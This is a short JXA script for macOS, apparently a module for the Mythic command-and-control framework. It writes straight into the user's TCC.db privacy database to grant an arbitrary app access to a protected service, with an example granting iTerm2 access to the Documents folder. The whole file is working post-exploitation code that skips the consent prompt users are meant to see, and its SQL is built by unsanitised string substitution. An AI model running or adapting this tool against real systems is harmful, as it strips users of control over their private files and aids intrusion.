ObjC.import('sqlite3');
ObjC.import('Foundation');
app = Application.currentApplication();
app.includeStandardAdditions = true;

function insert_item(value,item){
var err;
var username = $.NSUserName().js
var filename = $('/Users/' + username + '/Library/Application\ Support/com.apple.TCC/TCC.db').stringByStandardizingPath.js
var ppDb = Ref();
var err = $.sqlite3_open(filename, ppDb)
var db = ppDb[0]
if(err != $.SQLITE_OK) throw new Error($.sqlite3_errmsg(db))

var sql = `
INSERT INTO access values('valuehere','itemhere',0,1,1,NULL,NULL,0,'UNUSED',NULL,NULL,0)
`

var sql2 = sql.replace("valuehere",value).replace("itemhere",item)

var ppStmt = Ref()
var err = $.sqlite3_prepare(db, sql2, -1, ppStmt, Ref())
if(err != $.SQLITE_OK) throw new Error($.sqlite3_errmsg(db))
pStmt = ppStmt[0]

try {
		var err = $.sqlite3_exec(db,sql2,Ref(),Ref(),Ref())
		if (err != $.SQLITE_OK) throw new Error($.sqlite3_errmsg(db));

	}finally{
		var err = $.sqlite3_finalize(pStmt)
		var err = $.sqlite3_close(db)
		if(err != $.SQLITE_OK) throw new Error($.sqlite3_errmsg(db))
		var output = "[+] Added " + item + " to access " + value + " in the user's TCC database at ~/Library/Application Support/com.apple.TCC/TCC.db"
		return output
	}
}

//Example Usage from Mythic:
//1. jsimport AddToUserTCCDB.js
//2. jsimport_call{"command":"insert_item('kTCCServiceSystemPolicyDocumentsFolder','com.googlecode.iterm2')"}
